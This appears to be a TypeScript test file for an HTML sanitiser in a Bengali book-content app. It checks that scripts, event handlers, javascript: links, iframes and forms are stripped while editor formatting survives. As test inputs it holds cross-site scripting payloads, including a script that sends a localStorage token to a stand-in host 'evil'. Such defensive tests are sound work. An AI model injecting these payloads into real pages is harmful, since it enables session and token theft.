/* eslint-disable no-console */
/**
 * Pins both halves of the answer sanitiser: that it removes what can execute,
 * and that it keeps what the editor legitimately produces. The second half
 * matters as much as the first — an over-eager allowlist would silently rewrite
 * 1400 existing answers.
 *
 * Run:  npx ts-node src/__tests__/sanitize-answer.e2e.ts
 */
import { sanitizeAnswerHtml } from '../app/modules/bookContent/sanitizeAnswer';

let passed = 0;
let failed = 0;
const check = (cond: boolean, msg: string) => {
  if (cond) {
    passed++;
    console.log(`  ✅ ${msg}`);
  } else {
    failed++;
    console.log(`  ❌ ${msg}`);
  }
};

const s = (html: string) => sanitizeAnswerHtml(html) ?? '';

console.log('\n── Executable markup is removed ──');
{
  const out = s('<p>Hello</p><script>fetch("//evil/?t="+localStorage.token)</script>');
  check(!out.includes('<script'), 'script tag removed');
  check(!out.includes('localStorage'), 'script BODY removed, not left as text');
  check(out.includes('<p>Hello</p>'), 'surrounding content preserved');
}
check(!s('<img src=x onerror="alert(1)">').includes('onerror'), 'inline onerror handler removed');
check(!s('<div onclick="steal()">x</div>').includes('onclick'), 'onclick removed');
check(!s('<a href="javascript:alert(1)">x</a>').includes('javascript:'), 'javascript: href removed');
check(!s('<iframe src="//evil"></iframe>').includes('<iframe'), 'iframe removed');
check(!s('<object data="x"></object>').includes('<object'), 'object removed');
check(!s('<embed src="x">').includes('<embed'), 'embed removed');
check(
  !s('<style>body{background:url(//evil)}</style>').includes('evil'),
  'style block removed with its contents'
);
check(
  !s('<p style="background-image:url(javascript:alert(1))">x</p>').includes('javascript'),
  'javascript inside a style value removed'
);
check(!s('<svg/onload=alert(1)>').includes('onload'), 'svg onload removed');
check(!s('<form action="//evil"><input name=p></form>').includes('<form'), 'form removed');

console.log('\n── Legitimate editor output survives ──');
{
  const rich =
    '<h2 style="text-align:center">শিরোনাম</h2>' +
    '<p style="margin-left:24px;text-indent:12px">' +
    '<strong>গাঢ়</strong> <em>বাঁকা</em> <u>আন্ডারলাইন</u> <s>কাটা</s> ' +
    '<mark>হাইলাইট</mark> H<sub>2</sub>O x<sup>2</sup></p>' +
    '<p><span style="color:#c0392b;background-color:rgb(255,255,0);' +
    'font-family:\'Kalpurush\', sans-serif;font-size:18px">রঙিন</span></p>' +
    '<ul><li>এক</li><li>দুই</li></ul><ol start="3"><li>তিন</li></ol>' +
    '<blockquote>উদ্ধৃতি</blockquote><pre><code>code()</code></pre>' +
    '<table><thead><tr><th scope="col">ক</th></tr></thead>' +
    '<tbody><tr><td colspan="2">খ</td></tr></tbody></table>' +
    '<img src="https://magicviva.com/api/book-content/media/1-a.png" alt="ছবি" width="400">' +
    '<a href="https://example.com">লিংক</a><hr>';
  const out = s(rich);

  for (const tag of ['h2', 'strong', 'em', 'u', 's', 'mark', 'sub', 'sup', 'ul', 'ol', 'li',
    'blockquote', 'pre', 'code', 'table', 'thead', 'th', 'td', 'img', 'a', 'hr']) {
    check(out.includes(`<${tag}`), `<${tag}> kept`);
  }
  check(out.includes('text-align:center'), 'text-align kept');
  check(out.includes('margin-left:24px'), 'margin-left kept');
  check(out.includes('color:#c0392b'), 'hex colour kept');
  check(out.includes('background-color:rgb(255, 255, 0)') || out.includes('background-color:rgb('),
    'rgb() colour kept');
  check(out.includes('font-size:18px'), 'font-size kept');
  check(out.includes('font-family'), 'font-family kept');
  check(out.includes('colspan="2"'), 'colspan kept');
  check(out.includes('start="3"'), 'ol start kept');
  check(out.includes('/api/book-content/media/1-a.png'), 'media image src kept intact');
  check(out.includes('alt="ছবি"'), 'alt text kept');
  check(/[ঀ-৿]/.test(out), 'Bengali text preserved');
}

console.log('\n── Link hardening and edge cases ──');
{
  const out = s('<a href="https://example.com">x</a>');
  check(out.includes('rel="noopener noreferrer"'), 'external link gets rel=noopener noreferrer');
  check(out.includes('target="_blank"'), 'external link opens in a new tab');
}
check(s('<img src="data:image/png;base64,iVBORw0KGgo=">').includes('data:image/png'),
  'pasted data: image kept (an <img> cannot execute one)');
check(sanitizeAnswerHtml(undefined) === undefined, 'undefined passes through');
check(sanitizeAnswerHtml('') === '', 'empty string stays empty');
check(sanitizeAnswerHtml(null) === undefined, 'null passes through');
{
  // Idempotence: the backfill must converge, or every run rewrites every row.
  const once = s('<p style="color:#fff"><a href="https://x.test">y</a></p>');
  check(s(once) === once, 'sanitising twice equals sanitising once');
}

console.log(`\n${failed === 0 ? '✅ ALL PASS' : '❌ FAILURES'} — ${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);
